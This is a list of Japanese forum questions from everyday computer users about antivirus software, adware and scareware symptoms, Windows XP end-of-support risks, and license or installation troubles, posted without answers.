Microsoft Secuurity Essentials を入れたところ、PCに入っていたウィルスバスター試用版と競合しました。Microsoft Secuurity Essentials はMicrosoft社のものだから、ウィールス検疫除去の効果はあるのかなと思いますが、どれくらいでしょうか。削除するか迷っています。
nortonを間違えてアンインストールしてしまいました。 再インストールする方法はないでしょうか? また、もしインストール出来なかったら何かありますか?? 親共通のPCで不安です；
現在ウィルスバスターを利用しております。 orakleのjavaなどをインストールする際自動的にマカフィーがインストールされるのですが なぜでしょうか？何か怪しい気もするし必要もありませんのに無料とは？！
最近、ｗｉｎｄｏｗｓ8.1搭載のＰＣに買い換えました。 三か月間は、無料のウイルスバスターが入っていますが、もうすぐ無料期間が終わってしまいます。 検討しているのは、ウイルスセキュリティ0のwindows8対応版か、スーパーセキュリティゼロです。 重くなって動かなくなるのも困ります。 ＤＬ版とＣＤ版のどちらがいいかもわからないので、詳しい方、教えて下さい。 よろしくお願いします。
firefoxを使ってサイトを見ていると、画像のような広告ばかり出てきます。 どのサイトを見てもこの広告ばかり出てくるので、私のパソコンだけ 迷惑ソフトやウィスルに感染したのだと思います。 これの特定の仕方・消し方を教えて頂けますと幸いです。
最新定義ファイルのカスペルスキーが脆弱性攻撃を防げずウイルス感染し被害が出た実例ってありますか？ 脆弱性対策が重要だ！とか、アップデートを当てて常に最新状態にすること！が、ウイルス対策やファイアウォールより重要って根拠のある話なんでしょうか？
職場や学校など、公共性が高い場所のパソコンには、セキュリティ対策にウイルスバスターコーポレーション(corp)が使われていると思います。 しかし、それがどのように働いているかがわかりません。 (1)そのウイルスバスターの機能は常駐しているのでしょうか？それとも、各自で手動スキャンを行わなければ意味がないのでしょうか？ (2) 図書館や学校などでは、毎回使うパソコンは違うはずです(起動時に各自ログインする)が、例えばパソコンAを使っていてウイルスに感染した場合、パソコンA自体がウイルスに感染したのか、それともログインした人のアカウントが感染したのたか。 ご回答お願いいたします。
XPから７に切り替えているところです。 現段階で最強のアンチウィルスソフトを教えてください。 また、仕様は下記のとおりですが、やはり動作は遅くなるでしょうか。 Windows 7 Professional 64bit CPUIntel Core2Duo E7500 2.93GHz メインメモリ4GB (4096MB) DDR3 HDD ２５０GB
ウイルス感染の疑いのあるSDカードをWindows７のパソコンで、クイックフォーマット ではない、時間がかかる方法でフォーマット中です！ 　現在８回目のフォーマットが終わりました。もし、市販の復元ソフトを使用してウイルスファイルを復元できないようにするには、最低何回完全フォーマットしたほうがいいのでしょうか！？ 　 　　よろしくお願いします。
Windows 8.1 はセキュリティソフトをいれなくていいのですか？ 購入時から、入っていると聞きましたが、大丈夫でしょうか？？
パソコンにminiＳＤカードを接続して、新規フォルダーを作成すると変なファイルが 勝手に作られてしまいます。ウイルスでしょうか？
昨日友人数名から、携帯に（皆iphon)私から怪しいメールが送られてきたとのこと。 メールにはURLがついていて、開いた人はアダルト系の広告がついてきたとのこと。 共通の現象としてはもう数年間使っていないaolのメルアドから送信されており、２０名近くのアドレスがついていたとのこと。 私はすぐに自分のパソコンのウィールスバスタークラウドが最新バージョンかどうか、ちゃんと実行されているかの確認と、パソコン全体のスキャンを行ったのですが、ウィールスは検知されませんでした。 今後どのような対策をしたらいいのでしょうか。 どうぞお知恵をおかしください。
私のPCがマルウェアに感染したと思われます。 2週間くらい前から次のような症状が出ます。 ・勝手に次のようなWebページが表示される（****部分は省略）。 　http://jsf.jsticket.net/****** 　http://ja.reimageplus.com/******　 　ページのコンテンツはWindowsPCを修復します！といったものです。 ・gooのトップページを閲覧すると、ページ上部にバナー広告が表示される。 　バナー広告の下に次の文字列があります。 　Ads by OnlineBrowserAdvertising ・IEの下のウィンドウ枠を見ると、なにやら知らないページにアクセスしている 　痕跡が読みとれます。 ・ブラウザアクセスが遅いです。 きっかけは、おそらく無料のウィルス対策ソフトをダウンロードしたときだと 思われます。 そのソフトは既に削除しましたが、改善が見られないため、Mcafeeとか MSEとかAvastとかSpybotとか、他にもいくつかの無料の対策ソフトを 試していますが、スキャンを走らせても安全です、と表示されるだけで、 なかなかひっかからず 改善されません。 OSからの再インストールは極力さけたいですが、何か方法はないでしょうか？ 使用しているOSはWindowsVISTA home basicです。 ブラウザはIEの8です。 ご教示よろしくお願い致します。
写真にある 「Ｓｐｅｅｄｕｐ ＭｙＰＣ」というウイルスらしきものに感染してしまったようです。 １． 「コントロールパネル」から削除しようとしましたが 「Ｓｐｅｅｄｕｐ ＭｙＰＣ」が見つからず削除できません。 ２． ウイルスバスタークラウドを入れていますがブロックも削除もできません。 ３． 今のところ「何か悪さ」をされていません。 ４． 以前「Ｒｅｇ Ｃｌｅａｎ」 http://www.geocities.co.jp/Playtown-Yoyo/6130/no … に感染して、全てのファイルが「隠しファイル」にされてリカバリを余儀なくされました。 ５． このウイルスの削除方法をご存知ないでしょうか？ 宜しくお願い致します。
広く情報は上がっているとは思いますが、 WindowsXPサポート終了について詳しく教えていただけないでしょうか？ WindowsXPサポート終了となり、ウィルス侵入に注意が必要となりますが、 サポート終了前までは、セキュリティーホール対策などわかっている分については、 基本的に意識なくアップデートされているということでよろしいでしょうか？ サポート終了以降ですが、注意点としては、今後新しいセキュリティホールを 見つけられそれに合わせた、新しいウィルス、ハッキングなどに対してのみ 有効ではなく危険と考えて正しいでしょうか？ もし、OSが対策しておらずとも、市販のセキュリティソフトがこの新しいウィルス、ハッキング を阻止してくれると考えてよろしいでしょうか？ サポート終了してから日がたっておりませんが、今後も、市販のセキュリティソフトが 通常Winodws8向けですが、XPも動作できる限りウィルス、ハッキング を阻止してくれると考えてよろしいでしょうか？ いろいろ質問してすみませんが、ご回答お願いいたします。
ＰＣのＯＳ　ＸＰがサポート終了で、新しく8.1に買い換えました。 以前のＰＣはＸＰです＞ その古いＰＣには新設したＰＣのソフトが入ってないものがあります。 その為、どうしても使いたいと思ってます。 ＮＥＴは、ＬＡＮケーブルで接続してます。（旧ＰＣには接続はしません） 古いＸＰのＰＣにＬＡＮケーブルを接続させなければ、使用していても問題ないでしょうか？ ＣＤやＳＤカードがウイルスに感染してるかもと思い、新しいＰＣに挿入し、マカフィーでスキャンし安全かは確認してます。 他に注意しなければいけないことがあれば教えてください。
無料のセキュリティー・ソフトを二重にダウンロードしようと思うのですが差支えないでしょうか？ その場合推奨できるものがあれば教えてください。 よろしくお願いいたします。
ネットから何がしかの無料ソフトをダウンロードすると、再々、 　　　　「Reagclean Pro」　 という、ＰＣスキャンソフトのようなものがダウンロードされます。 何度か経験して、効果に疑問を感じ、今では怪しく思っているので その都度、コントロールパネルからアンインストールするようにしています。 が、今回はご丁寧に 　　　「このＰＣがクラッシュ寸前になっています・・・・・」 だったか、音声でそういう警告がありました。 ほっといても、今回も削除していいかと思うのですが、如何なものでしょうか。 また、実のところ、勢いで「Systweak PC Cleaner」という無料のダウンロード ソフトの紹介があり、それを今、動かしている最中ですが、全てをやってるのか かなり時間がかかりそうです。 多少、心配ではあるものの、やってみなければ分からないのでちょっと試して みています。 このソフトの信頼性についてもご教示いただければありがたいです。 ちなみに、現在使っているパソコンは購入後３年経過したデスクトップPCで、 TOSHIBA の　　QOSMIO とかいうものです。 起動時に（購入時に比べたら）少し時間がかかるようにはなりましたが、 使い出せばまだまだ、快適に使えます。 ウイルス等の対策は、ウイルスバスタークラウドか何かが現在、入っている と思うのですが、それで充分ではないかと思っています。 よろしくお願い致します。
こんばんわ 教えてください。 マカフィーの30日間無料体験版を、30日たたないうちにやめたいときはどのような手続きをしたらよいでしょうか
新しいGoogleマップに不満なので古いGoogleマップにしたままにしたいのですがウインドウを閉じると 毎回新しいGoogleマップになってしまいます。 ちゃんと [今後も使用する] をクリックしてもなるのですがどうしてでしょうか？ win7 64bit mse adblockedge disconnect ghostery no-cookie-for-google-search noscript を入れています。
パソコンがウィルス感染するとプリンターも故障しますでしょうか？
virusに感染しますか。 そのように受け取れるvirus記事が有ったので。 コンビニなどの複合複写機にUSBからvirusを仕込むことなど 出来るのか不思議なので。
ウイルスバスター2006のウイルス検索で「cryp_xed-6」というウイルスが出てきたのですが、これは具体的にどういったものでしょうか？ 危険度はどれくらいなのか・・・。低いみたいですが、どの程度・・・ていうか。 何が原因で出てきたのか・・・ネットのせいなのか他の何かなのか・・・。 駆除方法は・・・など。 あともう一つ、名前が分からないウイルスもあるみたいです。感染ファイルは分かりますが。 ウイルスバスターが実行した処理は「検出のみ」なのですが、これだけじゃあアブナイでしょうか。 「ウイルス駆除」とか「隔離」とかのボタンはクリック出来ない状態になっています。 消し方とか、その他、教えてください・・・。 知識浅くてすみません・・・。
オフラインのパソコンで、ウイルスバスターの更新ができないため、一年半前の保護機能のウイルスバスターでウイルス検索をしたところ、ウイルスは検出されませんでしたが、cookieが８つも検出されました。 これは一体どういうことなのでしょうか？表示されたcookieのいくつかを調べてみたところ、スパイウェアだということが判明しました。この場合、オフラインの状態でcookieがあったら何か被害はありますか？ また、cookieが８つもあったということで、オフラインのはずのこのパソコンがウイルスなどで勝手にネットワークに接続またはwifiに接続されていたのでしょうか？ また１つ心配なのは、公共性のかなり高いパソコンに何回か繋いだUSBをこのパソコンに繋いだことがあります。 回答お願いいたします。
You Tubeでよくオススメで出てくる「ヒカキン」が気持ち悪過ぎて不快です。 消去する方法、もしくは始めから掲載されないフィルタリング機能はないのでしょうか？ ウィルスのようにしか感じません。どなたか教えてください。
最近パソコンの調子が悪いので、カスペルスキーでぜい弱性スキャンをした所、ぜい弱性：3と検出されました。 検知されたぜい弱性は以下の通りです。 Adobe Flash Player 10.1 r52 ファイル C:\ Program Files (x86)\JustSystems_Setup\ATOK2012\GUIDE\g_atok.exe 修正をお勧めします Java(TM) PlatformSE binary ファイル C:\ Program Files (x86)\Java\jre7\bin\java.exe ぜい弱性：3と検知されたのですが、上記二点しか詳細が出てきませんでした。 また、ここ最近インターネットなどをしていると 「Catalyst Control Center: Host applicationは動作を停止しました 問題が発生したため、プログラムが正しく動作しなくなりました。 プログラムは閉じられ、解決策がある場合はWindowsから通知されます。」 という通知が来ます。これも何か関係があるのでしょうか？ すみませんがインターネットに大変疎い為、以前質問された同じような内容を見てもよくわかりませんでした。 上記二点の修正方法について、またCatalyst～がどういうものなのかについて判りやすく教えてくださると大変助かります。とても困っているので、どうかよろしくおねがいします。
除去できますか? スキャンしたら50のウイルスに感染していると出ました 除去するには3000円前後払えば 除去できるとあります。 買うとソフトが送られてきてインすと－ルでもするのでしょうか? 何もわからないので教えていただけますでしょうか?
ウィルスでパソコンがダメになる事があると聞きました。 wifiルーターも同時にダメになり、使用できなくなるのでしょうか？？
最近パソコンの調子が悪く、開いてもいないbingという検索サイトが次から次に出てきて消せない等の症状が出ていました。 アドバイス通り、リカバリーをしました。 すぐにウイルスバスターをダウンロードして、7月からウイルスバスターの効果が無くなりますと警告？も出ました。 しかし、またbingという検索サイトが次から次に出てきました。 もうお手上げ状態です。 パソコンに詳しい方、アドバイスお願いします。
昨日ぐらいでしょうか、メールのセキュリティーに関しての質問で、「何故そう言えるのか」といったようなタイトルだったと記憶しています。確か10個ぐらい回答が付いていたと思いました。一つ一つ読み返そうと思っていたら無くなっていたことについさっき気づきました。間違って削除されたのでしょうか？
YahooBB会員でノートンをかけていて自動更新なので重宝しています。 この度、フレッツ光を申し込んだところ、ここでもセキュリティをかけることを推進しています。 二重にかけることをはいけないみたいなので無視しても問題ないでしょうか。
NEC VersaPro VY11F/BH-T WindowsXP ウィルスソフトに無料のkingsoftを使っています。 立ち上げたときから添付の写真のような、ホームページ変更を何度も要求されます。 ツール　インターネットオプションで「Yahoo」を指定しても 「StartHome」に行こうとします。 kingsoftを入れるまでは、こういう現象は起こりませんでした。 よろしくお願いします。
このサイトは内容的には問題がなさそうな地域のポータルサイト的なリンク集のようです。 ttp://www.takagawa.com/wakabadai/wa1.htm ウイルスバスターズクラウドが、　危険なサイトとして、警告を出します。 【質問－１】 皆さんのPCでも警告されますか？ （ノートンアンチウィルスややカスペルスキーなどウイルスバスターズ以外） 警告は無視してこのサイトにアクセスすると。 QuickTimeのコンポーネントをインストールするよう促されます。 誘導されたボタンを押すと、これが現れます。 http://www.apple.com/quicktime/resources/compone … 【質問２】 英語のサイトへの誘導なので、一応用心して先へ進んでいません。 避けたほうが良いのでしょうか？ 【質問３】 このサイト　（地域のリンク集）は、誰が、どのような目的で作ったのでしょうか。 リンクをたどっても良くわかりません。 個人のホームページの”残骸”と考えればよいでしょうか？ 【質問４】 このサイトを危険と表示するウイルス対策ソフト これは過剰反応なのではないでしょうか。
XPパソコンを完全にオフラインにしてデータを作成(沢山のソフトの買い替えは費用が嵩みます) そのデータをUSBメモリーにコピーし　windows8(ネットに接続済み)パソコンにデータを送り込む、この様な行為もウイルス対策上危険なのでしょうか、「ウイルス対策としてDVDやUSBメモリーなどのリムーバブルメディアは一切使用しない、メディアを介してウイルスに感染する恐れがある」とネットに書き込まれています。 少々費用は掛かりますがデータをDVDにコピーし、そのDVDは使い捨てにする様な方法を考えているのですが、他に何か良い方法は無いでしょうか、例えばwindows8をネットから切断してデータをUSBメモリーで送り込みUSBメモリーを引き抜いてからネットに接続する、この方法でも危険でしょうか、当方パソコン初心者です、難しい専門用語は皆目理解できません宜しくお願い致します。
今使っているXP搭載のパソコンは、ワープロや表計算にしか使わないことにしています。 大事なデータは外付けHDに保存し、使用しないときは外しています。 インターネットするのは別のWindows7パソコンで行っています。 それがうかつなことに、この2台のパソコンは家庭内LANでつながっていることを思い出しました。 いかがでしょう、やはりこのXPパソコンはこのWindows7パソコン経由でウイルス汚染するのでしょうか。 よろしくお願い致します。
「差出人に心当たりのないメールをパソコンで受けたとき、それにファイルが添付されていたら 要注意、うっかり開くとウィルスに感染するかもしれない」 ということをよく言われます。 このことについて教えてください。 (1) メール本文だけを開いた段階で添付ファイルが自動的にダウンロードされてウィルスが入る ようなことはないのでしょうか？　最近はウィルスソフトのテクニックがますます進歩しているよう ですから、そのくらいの細工はできるようにも思いますが。 (2) メールを受信しただけ（開かない）で添付ファイルが自動的にダウンロードされウィルスが入る ような細工もできそうに思いますが、そういう心配はないのでしょうか？ なお、私はパソコンを使ってはいますが、ソフトとかOSのことはよく分かりません。専門用語なしに ご説明いただければ幸いです。
初心者なので変な質問と思います。 以前にVistaを使っていた時にアップデートをしていたらハードディスクの容量が一杯になってしまい起動などが遅くなってしまいました。 その為にWindows７に買い替えてからもあまりアップデートをしていませんでした。 最近になって「アップデートは無料のセキュリティソフトと同じ」と聞きました。 当然の事だったのかも知れませんが、勿論アップデートは行った方が良いのでしょうか？ もしくはセキュリティー関係（必要な物）だけ選ぶのでしょうか？ ローカルディスクDの容量は既に半分です。 簡単に教えて頂けると助かります。 どうぞ宜しくお願い致します！
いかなるサイトを開いても画面右上にぴらぴらと紙がめくれる様な広告が出ます。ゲームだったり車だったりいろんな広告です。どうやって駆除できますか？
Windows8のパソコンを使っているのですが、久しぶりに開いたらウイルスに感染していました…。 始めての経験でどうすればいいか分からず、無料のウイルス対策ソフトをダウンロードしようと奮闘しました。 しかし、途中でダウンロードが完了しないうちにダウンロードが出来ないまま終了してしまいます。 お店でウイルス対策ソフトを見るつもりなのですが、 お恥ずかしいことに、今月はカツカツ状態で高い物は買えません。 パソコンの知識がある方、経験者の方に教えて頂きたいのですが、 やはり、安かろう悪かろうで高い方がいいのですか？ 今の状態のパソコンにおすすめのソフトがあったら教えてください。 できたら値段もお願いします！ 今の状態から元に戻りますか？ 回答、お願いします。
今迄は「ウイルスバスター」を使っていました。 「KINGSOFT」というのが（無料でも）良いと聞いたのですが如何でしょうか？ （本当に性能が良いのならば何故無料版があるのか不思議です） 初心者なので簡単に教えて頂けると助かります。 宜しくお願いします！
現在Windows7とXPをプリンターLANで使っています。　XPはインアターネットでは使いません。 単独に写真整理に使います。　しかしプリンターだけは無線LANで使いたいのですが。 XPのインターネットを使えなくする方法、プリンターだけは使えるようにする方法があれば 教えてください。　　いまとりあえずlanのUSBは外しておきました。 プリンタLANはbuffaloのｗｚｒ-ｈｐ-ｇ302ｈです。
私は単なる市民ですが、アラブ首長国連邦アブダビのヤシーン氏という人 から、件名が「興味のある取引」の英文のメールが届きました そのメールには、PDFの添付ファイルがあるのですが、その添付ファイルを 開いた場合、ウィルスに感染することはないでしょうか。また、感染の危険 があるときは、感染の危険がないように添付ファイルを見る方法があるで しょうか。 よろしくお願いします。
今使用している御社のプリモで製造番号が540820－70248のＰＣを使用しています。 現状がウインドウズＸＰの３２ビットを使用しています。 このＰＣはウインドウズ７、６４ビットにアップデートできますか？ 御回答お願いします。
昨日、XPパソコンをウイルス対策ソフトでチェックしたら、 c:\WINDOWS\system32\rundll32.exe トロイの木馬に感染しています と出てしまいました。 対処法として 「削除」「このまま」 の２つの選択肢が表示されたのですが、 このファイルは削除してはいけないファイルと聞いていたので、 「このまま」を選択してパソコンを閉じました。 でも、これだと感染したままなんですよね。使わなければいいのでしょうが、いろいろなデータが入っているので、ネットにつながずにデータ置き場として使うつもりでいたんですけれど、どう対処したらよいでしょう？
XPを使い続ける会社から感染される可能性は？ 質問タイトルの通り、もうすぐXPサポートが終了しますが、 うちの会社はまだXPを使っており、職場の雰囲気から 買い替える様子はなさそうです。 万が一会社PCが感染して、その流れで 仕事関係で取引先にご迷惑をおかけしてしまわないか。 また会社連絡などで 自宅PCメールアドレスを使っているだけに、 ウイルスメールが自宅PCに受信されたり メルアドや個人情報が流れたりしないかと ぐるぐる不安になります。 （メカ音痴で素人だから、色々心配してしまう） その辺は大丈夫みたいという事を聞いているのですが、 何故大丈夫なのかその理由と根拠はさっぱり判らず。 上の人から直接お聞きしていないので、不安でなりません。 こういう場合、どうしたらいいでしょうか。 上の人に聞こうにもどう聞けば失礼に当たらないか、 悩んでいます。 仕事でネットで調べたり メールしたりしなければならないので、 今後も会社でXPを使い続けて大丈夫でしょうか・・・？ 心が弱く素人なので、どうか優しいお答えを頂けると助かります。 どうぞよろしくお願いいたします。
トロイの木馬を事前に仕込んでおいてそこから遠隔でルーター配下のパソコンを操作してルーターにアクセスさせる、という方法ではなく ブラウザで悪意あるサイトを見た瞬間に、ルーター配下のパソコンの そのブラウザ？ からルーターへアクセスさせる方法が あったように記憶しているのですが、ご存知の方はいませんでしょうか？ パスワードが設定されていない、またはadminのような初期設定の簡単なパスワードでは 悪意のあるサイトを見た瞬間にルーターにログイン可能、という内容だったと思います。 確か、この[ウィルス対策]のカテゴリーでセキュリティに詳しい方が ルーターを設置するだけでは安全ではないですよ、という警鐘を鳴らす意味で 紹介していた内容だと記憶しています。
WinXPのサポ終了ですが、お金もない人は同じと思いますが 、OSは徐々に壊れてゆくはずですし、ウイルスにもかかるの で、いずれはOSの再インストールになると思います。 私の場合は音楽やＣＧのファイルがあり、一応外付けHDDに バックアップしてありますが、例えば！ウイルスで犯されて、 OSを再インストして、その外付けHDDを繋いだら認識せず、 前回、新しくプライマリ？パーテーションとして再認識させたら フォーマットで内部が全部消えましたが、そうゆう事もありえま せんか？・・・・ なので、出来れば内臓ドライブでファイルを残して、尚且つ ＸＰの再インストールをしたのですが詳しくありません。 http://fromthree.ddo.jp/fromthree/PcRescue/WinRe … 色々検索したのですが、↑こちらのサイトを見ると、内臓HDD をパーテーションで分けて、OSだけのパーテーションにしてお けば、再インストールしても個人のファイルは消えないような 解釈をしてるのですが・・・合ってますか？ ただ、もしそうだとしてもそのパーテーションをどう区切って、 自分の大事なファイルを別にして、OSだけを蚊帳の外にする のかが、よく分かりません。 猿でも分かるサイトがありましたら教えてください。それとも 別の方法でOS再インストの再にファイルを守れれば、それ でも結構です。
XPパソコンを情報検索だけに使おうと思います。　他人には何も発信しないようにします。 自分のPCが動かなくなったらしょうがないと諦めますが、他人には迷惑が掛からないように したいと思います。　　写真の編集に特化した使います。 迷惑にはならないでしょうか。
お勧めのセキュリティーソフトは何でしょうか？ 最近、価格.comで 「キヤノンITソリューションズ ESET パーソナル セキュリティ」といのをはじめてみました、 今までずっと「ウイルスバスター」でしたが その他 (1)ノートン　　「３６０」とか違いが分かりませんが・・・ (2)カスペルスキー など 如何なものでしょうか？ 宜しくお願い致します。
PCを　有線から無線LAＮに変更しようか検討中なのですが、 ワイヤレスは危険度が高いのでしょうか？ ・通信内容が盗み見られる ・他人に無断で端末にアクセスされてしまう ・他人に使われたり、犯罪などに悪用されたりする などと書かれているのを読んだことがあります。 インターネットバンキング、FX　などをする場合は、有線のほうが安全でしょうか？ どうぞよろしくお願い致します。
PCはほぼ初心者レベルのものです。XPのサポートが終わるのでUbuntu12.04に乗り換えました。適当にネットで調べたところLinux系はウィルス感染は無いとのことですが少し心配です。そこでUbuntuユーザさんにお聞きしたいのですが、実際ファイアーウォールやセキュリティーソフト無しで使ってますか？よろしくお願いします。
サポート終了以降のWindows XPのパソコンとVista搭載のパソコンの2台それぞれでポイントサイトや楽天市場等を利用したり、ポイントサイトや楽天市場等とのメールの送受信をした場合、ポイントサイトや私のメールアドレスを経由して、Vista搭載のパソコンがウイルスに攻撃されたりする危険性はありますか？ 【先日上記内容で質問し回答を頂いたのですが、質問内容が説明不足でしたので補足します】 XPのパソコンとVISTAのパソコンは、全く別の場所にありネットワークは繋がっていません。この状態で、それぞれのパソコンでポイントサイトや楽天市場等を利用したり、ポイントサイトや楽天市場等とのメールの送受信をした場合、ポイントサイトや私のメールアドレスを経由して、Vista搭載のパソコンがウイルスに攻撃されたりする危険性はありますか？
はあるのですか。 XPサポート終了によってメールの受信が危険になることはありませんか。 メールのセキュリティはXPとは関係ないのですか。（thunderbird最新バージョンです） 開かないようにすることは出来ますが受信は避けられないので大丈夫か不安です。 もしも危険でしたら、Windows8に移行するまで停止することは出来ないでしょうか。
スマートフォンって　流行っているのですか？　 この人は２００７年に発表して　いるようなのですが。　彼は大学も出ていない　おちこぼれだから？ 確か今年　２０１４年ですよね・・・・・
PCをリカバリしましたが、その際プリインストールのマカフィーをインストールしました。 次の問題が起こっているので質問します。 (1)「更新の確認」を行っても「更新の確認」までは進むが「ダウンロード」は0%から進まない。 (2)IEのサイトアドバイザがグレーである。サイトアドバイザの登録を選択しようとしてもグレイアウトしていて選択できない。 (3)PCの起動時にマカフィーの起動を表示する、という設定をしたはずなのに、PC起動時に表示されない。 追記： ・　リカバリ前にマカフィーは使っていません。 ・　マカフィーにもWEBから問い合わせましたが、2営業日掛かるかも知れない、と書かれていたため、こちらにも投稿します。 よろしくお願いします。
このソフトウェアは何か教えてください！ そして、危険ですか？？ ------------------------------------------- ソフトウェア名　install packages\uninstraller.exe 発行者　Download amp -------------------------------------------
今現在、Avira Free Antvirusを使っているのですが、私のパソコンではスキャンに管理者権限が必要になるようになりました。皆さんの環境下ではどうなっていますか？
１．通販購入とメール用　個人の本当のデータはここに格納 ２．遊び用　（真面目な遊び用）と1の予備　 ３．ちょっとアレなサイト用　Ａ　捨てアドレス　仮名で使う。 　　おかしくなったらすぐにリカバリ。 ４．ちょっとアレなサイト用　Ｂ　3の予備 　 　（アレなところとは海外発信のサイトです。） このような使い分けをしていますがセキュリティ対策として有効でしょうか。 4台すべてＷｉｎｄｏｗｓアップデートは欠かさず行いアンチウイルスソフトを入れています。 アレなところではアンチウイルスソフトが警告してくれますがその先へ進みます。 自分ができるだけわからないようにして使います。串とかも。 ちなみにここは3で書いています。 3や4で使ったＵＳＢメモリーは1や2には挿しません。
サポート終了以降もWindows XP搭載のパソコンを使用した場合、サポート終了以前に削除したデー　タ(エクセルやワードで作成したもの)も外部から復元されて盗まれるという危険性はありますか？　 復元を阻止するソフトで削除したファイルを掃除しておけば大丈夫でしょうか？
サポート終了後もWindows XP搭載のパソコンを使用した場合 (1)ポイントサイトを利用すると、サイトとに登録した個人情報等が漏れたり、貯めたポイントを使われたりするのでしょうか？それとも、サイト側のサーバーで防御されるものなのでしょうか？ (2)XPのパソコン内のデータが漏れる危険性は理解していますが、XPのパソコンにUSBメモリーをセットして、(パソコンにはUSBメモリーのデータをインストールしないで)USBメモリー上だけで作業し保存した場合でも、USBメモリーのデータが漏れる危険性はあるのでしょうか？
ここ数年、ノートンを使用しています。 ネット経由で毎年延長更新しています。 ノートンは、インストールライセンスが３つあり、１つの契約で3台のPCにインストールすることができます。 現在、メインのデスクトップのWinXP機と、ノートのWinVista機の2台にインストールしてあります。 ノートンアカウントにサインインして確認してみると、2台のPCにインストールしてあるため、 インストールライセンスが３、利用可能なダウンロード数が１と表示されています。 先日、仕事で使用するため、小型ノートのWin8機を購入し、続いて WinXPのサポート終了に伴いデスクトップのWinXP機の引退を決め、デスクトップのWin8機を購入しました。 2台のWin8機は、今は購入時に入っていたマカフィーが使えていますが、90日で期限が切れてしまうので、遅かれ早かれノートンに乗り換えなければなりません。 WinXP機は引退するので、ノートンが不要となり、 ノートンが必要なPCは3台になるわけですが、 インターネットに接続状態でWinXP機からノートンをアンインストールすると、ノートン側で認識し、 利用可能なダウンロード数は現在の１から２に増えるものなのでしょうか？ それとも、WinXP機は、３つのインストールライセンスのうち１つを抱いたまま引退となってしまうのでしょうか？
　ウイルスバスターで検知されたログで、2014/3/2 5:45:00に「TROJ_SPNV.03KI13」 が感染していまして、手動スキャンで発見しました。 　 　　自動で検出されなかったのが残念です。　 　 　ウイルスログには 　影響を受けるファイル ・・・Downloads¥Minecraft_1.5.2_Cracked_[Full_Installer]_[Online]_[Server_List]_.exe 　とありました。 　子供のゲームみたいです。 　　　 　どんな種類のウイルスか知りたいです。 　　よろしくお願いいたします。 　　
インストール可能台数があると思いますが、同一世帯と限定されていると、友達に使わせることは 出来ない仕組みなのでしょうか？同一世帯でしか使えないようになっている仕組みを教えてください。
対策できないのでここで質問失礼します。 OS:Windows 7 ブラウザ:Firefox ウイルス対策ソフト:Avast 以上を使用しています。 先日海外サイトでmp3をフリーDLした際に感染したものかと思います。 ネットで似た事例を見て、その解決策をいくつか試しましたが効果がありませんでした。 具体的な症状としては (1)広告が出てくる (2)ブラウザの読み込みが遅く、画像などもブレたように表示される (3)グーグルマップのような大容量の物が表示されない (4)FirefoxだけではなくIEやChromでも同様の症状がある コンパネで怪しそうなファイルを探しましたがそれらしいのも分からず、アドオンにも怪しい物はなし。 市販のウイルスソフトを入れるか、リカバリーをかけるしか対策は無いのでしょうか？ よろしくお願いします。
子供のパソコンのバスター更新ですが、直販よりネット通販でダウンロード版を購入した場合、(1)シリアル番号を打ち込めば、更新できるのでしょうか。(2)１台すれば３台自動で更新できるのでしょうか　(3)私が購入し子供のパソコンに入力すればいいでしょうか（メールアドレスの違いなどは問題ないでしょうか）購入でのアドレス　Ａ　 子供のパソコンのメルアド　Ｂ
ヘッドフォンを付けた状態でyoutubeでお気に入りの音楽を連続再生しながら youtube以外のサイトをよく見ています。 ふと思ったのですが悪意のあるサイトによっては、アクセスすると同時にHTML5またはflash動画形式で、難聴になるほどのとてつもなく大きな音を自動的に再生させてしまうことは可能なのでしょうか。 それとも、悪意のあるサイト側の音量と(パソコンの右下アイコンの)スピーカーの音量の関係では、悪意のあるサイト側で音量を無制限に大きくしていても、スピーカーの%に応じてヘッドフォンに聞こえる実際の音量の上限が決まり(%が小さいほど音量の上限は小さくなる)、難聴になるようなとんでもない音は決して鳴らず安全でしょうか？ 具体的には↓のようなイメージです ------ 悪意のあるサイトで音量を無制限に大きくしていても、スピーカーの音量が11%であればその11%での最大の音(上限の音)がヘッドフォンで聞こえ、スピーカーの音量が5%であればその5%での最大の音(上限の音)がヘッドフォンで聞こえるだけ [無制限音量の悪意のあるサイトにアクセスした時の音の大きさの比較] 悪意のあるサイトの無制限の音量(危険な音量)＞＞＞＞＞＞＞＞＞＞＞＞スピーカー11%設定で実際にヘッドフォン上で聞こえる音量(安全な音量)＞＞スピーカー5%設定で実際にヘッドフォン上で聞こえる音量(さらに安全な音量) ----------- スピーカーの音量の[%]がそもそも何を意味しているのかも分かっていないので、その点についても併せて教えていただければ有難いです。 [私のパソコンのOSはwindows7で、右下アイコンのスピーカーの音量は11%に設定しています]
無料動画サイトを利用しはじめたら、あなたのコンピューターに問題があるので、ここをクリックしなさいというポップアップメッセージが点滅を始めました。 無視していると消えましたが、こちらのしらないうちに何か悪さをされるということは無いでしょうか？
サポート終了以降もWindows XPを使用している人のパソコンデータ(エクセルやワードで作成したもの)を、USBメモリーでVista搭載のパソコンにインストールすることになった場合、もしXPのパソコンがウィルス等に感染していたら、Vista搭載のパソコンも感染してしまうのでしょうか？それとも、Vista搭載のパソコンはサポートが継続中であり、セキュリティソフト(ウィルスバスター)がインストールされているので、USBメモリーを介してウィルス等が侵入することを防いでくれるのでしょうか？
経緯を説明します。 当方、Windows8.1　IE10を使用しています。 (1)Onedriveである圧縮ファイルをダウンロードしたら下記メッセージ OneDrive は "XXX.lzh" のウイルスをスキャンできません。このファイルをダウンロードするには、[続行] を選択してください。 コンピューターを保護するにはウイルス対策ソフトウェアを取得してください。 (2)ウイルス対策ソフトウェアを取得してください。をクリック http://windows.microsoft.com/en-US/windows/antiv … Consumer security software providersの画面 (3)上記画面はWindows8.1は対象外みたいなので　日本語版 ■ PC をウイルスから保護する方法 http://windows.microsoft.com/ja-jp/windows-8/how … Applies to Windows 8.1 とこれから先どう対処していいかわかりません。また、” Microsoft が装備している” とWindows 標準のセキュリティソフトがあるのに新たに準備しなければならないでしょうか どなたかアドバイスください。
タイトルの通り、Avira Free Antivirus でのファイルを右クリックして行うスキャンについてです。 先日、そのスキャンをしようとしたのですが、ボタンを押した直後にユーザーアカウント制御の画面が出てしまうようになりました。 また、aviraのメイン画面にある「system scaner」でのいずれのスキャンも、管理者としてしか実行できません。 以前はこのようなことはなかったのですが、新たな仕様でしょうか。 ちなみにpcは windows7 home premiumです。 ご存知の方、ご教授お願いします。
